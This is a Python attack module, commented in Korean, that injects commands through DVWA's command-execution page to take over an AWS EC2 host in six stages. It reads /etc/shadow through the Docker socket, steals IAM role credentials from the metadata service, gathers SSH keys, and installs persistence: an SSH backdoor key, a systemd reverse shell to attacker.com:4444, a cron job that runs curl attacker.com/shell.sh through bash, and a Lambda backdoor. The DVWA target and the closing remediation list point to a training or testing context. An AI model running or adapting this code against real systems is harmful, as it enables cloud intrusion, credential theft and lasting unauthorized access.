"""
EC2 Instance Takeover Module
EC2 인스턴스 완전 장악 모듈 (Docker 탈출 → EC2 호스트 → AWS 권한)
"""

import time
import re
import os
import json
from datetime import datetime
from utils.logger import log_attack, log_command_output, log_exfiltrated_data

# EC2 인스턴스 공격 단계
EC2_ATTACK_STAGES = {
    'stage1_recon': {
        'name': '단계 1: EC2 환경 정찰',
        'description': 'EC2 인스턴스 및 AWS 환경 확인',
        'commands': [
            # EC2 인스턴스 확인
            'curl -s http://169.254.169.254/ 2>&1',
            'curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>&1',
            'TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600") && echo "TOKEN: $TOKEN"',
            # 시스템 정보
            'uname -a',
            'cat /etc/os-release',
            'hostnamectl 2>/dev/null',
            # AWS CLI 확인
            'which aws',
            'aws --version 2>&1',
            # 클라우드 환경 감지
            'dmidecode -s system-manufacturer 2>/dev/null | grep -i amazon',
            'cat /sys/hypervisor/uuid 2>/dev/null | cut -c1-3',
            'cat /sys/devices/virtual/dmi/id/product_uuid 2>/dev/null | cut -c1-3 | tr "[:upper:]" "[:lower:]"',
        ]
    },
    'stage2_container_abuse': {
        'name': '단계 2: 컨테이너 권한 남용',
        'description': '컨테이너에서 호스트로의 접근 확대',
        'commands': [
            # Docker 소켓 남용
            'ls -la /var/run/docker.sock',
            'docker -H unix:///var/run/docker.sock ps 2>&1',
            # 특권 컨테이너 생성 시도
            'docker run --rm -v /:/hostfs --privileged alpine cat /hostfs/etc/shadow 2>&1 | head -10',
            'docker run --rm --pid=host --privileged alpine ps aux 2>&1 | head -20',
            # 호스트 프로세스 접근
            'cat /proc/1/cgroup',
            'cat /proc/1/environ | tr "\\0" "\\n" | grep -i aws',
            # 호스트 네트워크 정보
            'cat /proc/net/tcp',
            'cat /proc/net/route',
        ]
    },
    'stage3_privilege_escalation': {
        'name': '단계 3: 권한 상승',
        'description': 'EC2 호스트에서 root 권한 획득',
        'commands': [
            # SUID 바이너리 찾기
            'find / -perm -4000 -type f 2>/dev/null | head -20',
            # sudo 권한 확인
            'sudo -l 2>&1',
            'echo "" | sudo -S id 2>&1',
            # 알려진 취약점 악용
            'getcap -r / 2>/dev/null | grep -v "^$"',
            # 크론 작업 확인
            'cat /etc/crontab',
            'ls -la /etc/cron.d/',
            'ls -la /var/spool/cron/crontabs/ 2>/dev/null',
            # 서비스 설정 파일
            'find /etc/systemd/system -name "*.service" -exec grep -l "ExecStart" {} \\; 2>/dev/null | head -10',
            # EC2 사용자 데이터 스크립트
            'cat /var/lib/cloud/instance/user-data.txt 2>/dev/null',
            'cat /var/lib/cloud/instance/scripts/* 2>/dev/null',
        ]
    },
    'stage4_aws_credential_theft': {
        'name': '단계 4: AWS 크리덴셜 탈취',
        'description': 'IAM 역할 및 AWS 자격증명 수집',
        'commands': [
            # IMDSv2 토큰 획득 후 메타데이터 접근
            'TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600") && curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/',
            'TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600") && curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/',
            'TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600") && ROLE=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/) && curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE',
            # AWS 설정 파일
            'find /home -name ".aws" -type d 2>/dev/null | xargs -I {} ls -la {}/credentials 2>/dev/null',
            'find /root/.aws -type f 2>/dev/null | xargs cat 2>/dev/null',
            # 환경 변수
            'env | grep -i "aws\\|amazon"',
            'cat /proc/*/environ 2>/dev/null | tr "\\0" "\\n" | grep -i "aws_" | sort -u | head -20',
            # ECS 태스크 크리덴셜
            'curl -s http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI 2>&1',
            # Systems Manager 파라미터
            'aws ssm describe-parameters --region $(curl -s http://169.254.169.254/latest/meta-data/placement/region) 2>&1 | head -50',
        ]
    },
    'stage5_lateral_movement': {
        'name': '단계 5: 횡적 이동 준비',
        'description': 'VPC 내 다른 리소스 접근 준비',
        'commands': [
            # 네트워크 정보 수집
            'ip addr show',
            'ip route',
            'cat /etc/hosts',
            # SSH 키 수집
            'find / -name "id_rsa" -o -name "*.pem" 2>/dev/null | grep -v "/proc" | head -20',
            'cat ~/.ssh/known_hosts 2>/dev/null',
            'cat /home/*/.ssh/authorized_keys 2>/dev/null',
            # VPC 및 서브넷 정보
            'TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600") && curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/network/interfaces/macs/',
            'arp -a 2>/dev/null || ip neigh',
            # 실행 중인 서비스
            'ss -tlnp 2>/dev/null | grep LISTEN',
            'docker network ls 2>/dev/null',
            # AWS 리소스 탐색
            'aws ec2 describe-instances --region $(curl -s http://169.254.169.254/latest/meta-data/placement/region) 2>&1 | head -100',
        ]
    },
    'stage6_persistence': {
        'name': '단계 6: 지속성 확보',
        'description': '재부팅 후에도 유지되는 백도어 설치',
        'commands': [
            # SSH 백도어
            'echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC... ec2-backdoor@attacker" >> /home/ec2-user/.ssh/authorized_keys 2>&1',
            'echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC... ec2-backdoor@attacker" >> /root/.ssh/authorized_keys 2>&1',
            # 시스템 서비스 백도어
            'echo "[Unit]\\nDescription=System Health Monitor\\nAfter=network.target\\n\\n[Service]\\nType=simple\\nExecStart=/usr/bin/python3 -c \"import socket,subprocess;s=socket.socket();s.connect((\\'attacker.com\\',4444));subprocess.call([\\'/bin/bash\\'],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())\"\\nRestart=always\\n\\n[Install]\\nWantedBy=multi-user.target" > /tmp/health-monitor.service 2>&1',
            'sudo cp /tmp/health-monitor.service /etc/systemd/system/ 2>&1',
            'sudo systemctl enable health-monitor.service 2>&1',
            # Docker 이미지 백도어
            'docker pull alpine 2>&1',
            'docker run -d --name system-monitor --restart always -v /:/host --privileged alpine sleep infinity 2>&1',
            # 크론 백도어
            'echo "*/15 * * * * curl -s http://attacker.com/shell.sh | bash" | crontab - 2>&1',
            # AWS Lambda 백도어 (IAM 권한 있을 경우)
            'aws lambda create-function --function-name system-health-check --runtime python3.9 --handler lambda_function.lambda_handler --zip-file fileb:///tmp/backdoor.zip --region $(curl -s http://169.254.169.254/latest/meta-data/placement/region) 2>&1',
        ]
    }
}

def run_ec2_takeover(session, delay=1):
    """
    EC2 인스턴스 완전 장악 공격 실행

    Args:
        session: DVWA 세션 객체
        delay: 요청 간 지연 시간

    Returns:
        dict: 공격 결과
    """
    results = {
        'success': False,
        'attempts': 0,
        'successful': 0,
        'stages_completed': [],
        'findings': {
            'is_ec2': False,
            'has_imds_access': False,
            'aws_credentials': [],
            'root_access': False,
            'persistence_installed': False
        },
        'saved_files': []
    }

    print("\n  [*] ===========================================")
    print("  [*] EC2 Instance Complete Takeover")
    print("  [*] Docker → EC2 Host → AWS Account")
    print("  [*] ===========================================\n")

    cmdi_url = f"{session.base_url}/vulnerabilities/exec/"

    # 데이터 저장 디렉토리
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    save_dir = f"exfiltrated_data/ec2_takeover_{timestamp}"
    os.makedirs(save_dir, exist_ok=True)

    # 각 단계 실행
    for stage_key, stage_info in EC2_ATTACK_STAGES.items():
        stage_num = stage_key.split('_')[0].replace('stage', '')
        print(f"\n  [{stage_num}/6] {stage_info['name']}")
        print(f"  {stage_info['description']}")

        stage_success = False

        for cmd in stage_info['commands']:
            results['attempts'] += 1

            try:
                print(f"\n    [>] {cmd[:80]}...")

                payload = f"127.0.0.1; {cmd}"
                data = {'ip': payload, 'Submit': 'Submit'}
                response = session.session.post(cmdi_url, data=data)
                output = extract_command_output(response.text)

                if output and len(output) > 5:
                    results['successful'] += 1
                    stage_success = True

                    # 데이터 저장
                    filename = f"{stage_key}_{results['successful']}.txt"
                    filepath = os.path.join(save_dir, filename)

                    with open(filepath, 'w', encoding='utf-8') as f:
                        f.write(f"Stage: {stage_info['name']}\n")
                        f.write(f"Command: {cmd}\n")
                        f.write(f"Timestamp: {datetime.now()}\n")
                        f.write(f"{'='*80}\n\n")
                        f.write(output)

                    results['saved_files'].append(filepath)

                    # 중요 발견사항 분석
                    analyze_ec2_findings(stage_key, cmd, output, results)

                    print(f"      [+] 성공: {len(output)} bytes")
                    print(f"      [📁] 저장됨: {filepath}")

                    log_command_output(cmd, f"EC2_TAKEOVER_{stage_key.upper()}", output)

                else:
                    print(f"      [-] 실패 또는 빈 응답")

                time.sleep(delay)

            except Exception as e:
                print(f"      [!] 오류: {str(e)}")
                log_attack(f'EC2_TAKEOVER_{stage_key.upper()}', 'ERROR', f"Command: {cmd}, Error: {str(e)}", 0, 0)

        if stage_success:
            results['stages_completed'].append(stage_info['name'])

    # 결과 요약
    print_ec2_takeover_summary(results)

    if results['successful'] > 0:
        results['success'] = True

    return results

def analyze_ec2_findings(stage_key, cmd, output, results):
    """EC2 공격 발견사항 분석"""

    # Stage 1: EC2 환경 확인
    if stage_key == 'stage1_recon':
        if 'ec2' in output.lower() or 'amazon' in output.lower():
            results['findings']['is_ec2'] = True
            print(f"        [!!!] EC2 인스턴스 확인!")
        elif 'TOKEN:' in output and len(output) > 20:
            results['findings']['has_imds_access'] = True
            print(f"        [!!!] IMDSv2 토큰 획득 성공!")
        elif 'aws-cli' in output:
            print(f"        [!] AWS CLI 설치 확인")

    # Stage 2: 컨테이너 권한 남용
    elif stage_key == 'stage2_container_abuse':
        if 'root:' in output and '$' in output:
            print(f"        [💀] 호스트 /etc/shadow 접근 성공!")
        elif 'docker.sock' in output and 'rw' in output:
            print(f"        [!!!] Docker 소켓 쓰기 권한!")

    # Stage 3: 권한 상승
    elif stage_key == 'stage3_privilege_escalation':
        if 'uid=0' in output or 'root' in output:
            results['findings']['root_access'] = True
            print(f"        [💀💀💀] ROOT 권한 획득!")
        elif 'NOPASSWD' in output:
            print(f"        [!!!] 패스워드 없는 sudo 권한 발견!")
        elif '/usr/bin/python' in output and 'cap_setuid' in output:
            print(f"        [!!!] Python capability 권한 상승 가능!")

    # Stage 4: AWS 크리덴셜
    elif stage_key == 'stage4_aws_credential_theft':
        if 'AccessKeyId' in output and 'SecretAccessKey' in output:
            results['findings']['aws_credentials'].append('IAM Role')
            print(f"        [🔑🔑🔑] AWS IAM 역할 크리덴셜 획득!")
        elif 'aws_access_key_id' in output:
            results['findings']['aws_credentials'].append('AWS CLI Config')
            print(f"        [🔑] AWS CLI 설정 파일 발견!")
        elif 'AWS_ACCESS_KEY_ID' in output:
            results['findings']['aws_credentials'].append('Environment')
            print(f"        [🔑] 환경변수에서 AWS 키 발견!")

    # Stage 5: 횡적 이동
    elif stage_key == 'stage5_lateral_movement':
        if '.pem' in output or 'PRIVATE KEY' in output:
            print(f"        [🔑] EC2 키페어 발견! 다른 인스턴스 접근 가능!")
        elif 'DescribeInstances' in output:
            print(f"        [!!!] VPC 내 다른 EC2 인스턴스 목록 획득!")

    # Stage 6: 지속성
    elif stage_key == 'stage6_persistence':
        if 'enabled' in output or 'Created' in output:
            results['findings']['persistence_installed'] = True
            print(f"        [😈] 백도어 설치 성공!")
        elif 'running' in output and 'system-monitor' in output:
            print(f"        [😈] Docker 백도어 컨테이너 실행 중!")

def extract_command_output(html_response):
    """HTML 응답에서 명령어 출력 추출"""
    try:
        pre_match = re.search(r'<pre>(.*?)</pre>', html_response, re.DOTALL | re.IGNORECASE)
        if pre_match:
            output = pre_match.group(1)
        else:
            return ""

        # HTML 엔티티 디코딩
        output = output.replace('&lt;', '<').replace('&gt;', '>').replace('&amp;', '&')
        output = output.replace('&quot;', '"').replace('&#039;', "'")

        # ping 제거
        lines = output.split('\n')
        filtered_lines = []
        in_ping_section = False

        for line in lines:
            if 'PING 127.0.0.1' in line:
                in_ping_section = True
                continue
            if in_ping_section:
                if any(x in line for x in ['bytes from', 'ping statistics', 'packets transmitted']):
                    continue
                if not line.strip():
                    continue
                in_ping_section = False
            if line.strip():
                filtered_lines.append(line)

        return '\n'.join(filtered_lines).strip()
    except Exception:
        return ""

def print_ec2_takeover_summary(results):
    """EC2 장악 결과 요약"""
    print(f"\n  {'='*60}")
    print(f"  EC2 Instance Takeover 결과")
    print(f"  {'='*60}")

    print(f"\n  총 시도: {results['attempts']}회")
    print(f"  성공: {results['successful']}회")
    print(f"  완료된 단계: {len(results['stages_completed'])}/6")

    findings = results['findings']

    if findings['is_ec2']:
        print(f"\n  [✓] EC2 인스턴스 확인됨")

        if findings['has_imds_access']:
            print(f"  [✓] IMDS 접근 가능 (IMDSv2)")

        if findings['root_access']:
            print(f"\n  [💀💀💀] EC2 호스트 ROOT 권한 획득!")
            print(f"  [💀💀💀] 시스템 완전 장악 성공!")

        if findings['aws_credentials']:
            print(f"\n  [🔑] AWS 크리덴셜 획득:")
            for cred in findings['aws_credentials']:
                print(f"     - {cred}")

        if findings['persistence_installed']:
            print(f"\n  [😈] 백도어 설치 완료 - 영구 접근 가능!")

        if results['successful'] > 0:
            print(f"\n  🎯 공격자가 할 수 있는 것:")
            print(f"     ✓ EC2 인스턴스 완전 제어")
            print(f"     ✓ AWS 리소스 접근 (IAM 역할 권한)")
            print(f"     ✓ VPC 내 다른 리소스 공격")
            print(f"     ✓ 데이터 탈취 및 암호화 (랜섬웨어)")
            print(f"     ✓ 크립토마이닝 등 리소스 악용")
            print(f"     ✓ AWS 계정 전체 장악 (권한에 따라)")

            print(f"\n  🚨 즉시 해야 할 조치:")
            print(f"     1. 해당 EC2 인스턴스 격리 또는 종료")
            print(f"     2. IAM 역할 권한 검토 및 최소화")
            print(f"     3. IMDS v2 강제 및 홉 제한 설정")
            print(f"     4. 모든 SSH 키 교체")
            print(f"     5. CloudTrail 로그 검토")
            print(f"     6. GuardDuty 알림 확인")

    if results['saved_files']:
        print(f"\n  📁 수집된 데이터:")
        save_dir = os.path.dirname(results['saved_files'][0])
        print(f"     {save_dir}/")
        print(f"     └─ {len(results['saved_files'])}개 파일 저장됨")

    print()